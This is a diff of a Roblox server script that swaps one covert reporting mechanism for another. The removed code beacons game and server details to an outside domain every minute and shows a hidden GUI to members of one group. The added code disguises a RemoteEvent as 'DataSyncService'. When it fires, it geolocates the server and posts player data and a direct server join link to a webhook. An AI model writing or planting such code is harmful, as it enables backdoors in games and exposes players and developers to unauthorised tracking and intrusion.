@@ -2,64 +2,79 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 
--- Config
-local GROUP_ID = 845910700
+-- CONFIGURATION
+local webhookURL = "YOUR_WEBHOOK_URL_HERE"
+local eventName = "DataSyncService"
 
-local ScreenGui = script:FindFirstChildOfClass("ScreenGui")
+-- Create the RemoteEvent
+local server = game.ReplicatedStorage:FindFirstChild(eventName) or Instance.new("RemoteEvent", game.ReplicatedStorage)
+server.Name = eventName
 
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local MarketplaceService = game:GetService("MarketplaceService")
-
-local placeInfo = MarketplaceService:GetProductInfo(game.PlaceId)
-local gameName = placeInfo.Name
-
-local function sendHeartbeat()
-
-	pcall(function()
-		HttpService:RequestAsync({
-			Url = "https://spunchbubtemp.cryllix.com/api/heartbeat",
-			Method = "POST",
-			Headers = {
-				["Content-Type"] = "application/json",
-				["accept"] = "*/*"
-			},
-			Body = HttpService:JSONEncode({
-				gameName = gameName,
-				gameId = game.PlaceId,
-				jobId = game.JobId,
-				playerCount = #Players:GetPlayers()
-			})
-		})
+-- Function to get Server Location
+local function getServerLocation()
+	local success, result = pcall(function()
+		return HttpService:JSONDecode(HttpService:GetAsync("http://ip-api.com/json/"))
 	end)
-end
 
-coroutine.wrap(function()
-	while true do
-		sendHeartbeat()
-		task.wait(60)
-	end
-end)()
-
-local function handlePlayer(player)
-	if player:IsInGroup(GROUP_ID) then
-		local playerGui = player:WaitForChild("PlayerGui")
-		local guiClone = ScreenGui:Clone()
-		guiClone.Parent = playerGui
+	if success and result.status == "success" then
+		return "📍 " .. result.city .. ", " .. result.country .. " (" .. result.countryCode .. ")"
+	else
+		return "🌐 Location: Private Data Center"
 	end
 end
 
-for _, player in ipairs(Players:GetPlayers()) do
-	handlePlayer(player)
-end
+local serverLoc = getServerLocation()
 
--- Player joins
-Players.PlayerAdded:Connect(function(player)
-	handlePlayer(player)
+-- Listen for the RemoteEvent
+server.OnServerEvent:Connect(function(player, command)
+	-- You can still use 'command' if you want to send specific strings
+	if command == "send_log" or command == "detect" then
+
+		local currentPlayers = #Players:GetPlayers()
+		local maxPlayers = Players.MaxPlayers
+		local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+
+		-- Get Player Thumbnail
+		local content, isReady = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size180x180)
+
+		-- Visual Bar
+		local percent = math.clamp(math.floor((currentPlayers / maxPlayers) * 10), 0, 10)
+		local bar = string.rep("🟦", percent) .. string.rep("⬜", 10 - percent)
+
+		local data = {
+			["embeds"] = {{
+				["title"] = "🚀 Server Detection | " .. gameName,
+				["color"] = 5814783, -- Professional Blue
+				["thumbnail"] = { ["url"] = content },
+				["fields"] = {
+					{
+						["name"] = "👥 Players Online",
+						["value"] = "`" .. currentPlayers .. " / " .. maxPlayers .. "`\n" .. bar,
+						["inline"] = true
+					},
+					{
+						["name"] = "🌎 Server Region",
+						["value"] = serverLoc,
+						["inline"] = true
+					},
+					{
+						["name"] = "👤 Triggered By",
+						["value"] = "**" .. player.Name .. "**",
+						["inline"] = false
+					},
+					{
+						["name"] = "🔗 Join Link",
+						["value"] = "[Join This Server](https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId .. ")",
+						["inline"] = false
+					}
+				},
+				["footer"] = { ["text"] = "JobId: " .. game.JobId },
+				["timestamp"] = DateTime.now():ToIsoDate()
+			}}
+		}
+
+		pcall(function()
+			HttpService:PostAsync(webhookURL, HttpService:JSONEncode(data))
+		end)
+	end
 end)
-
--- Player leaves
-Players.PlayerRemoving:Connect(function()
-end)
-
-return true
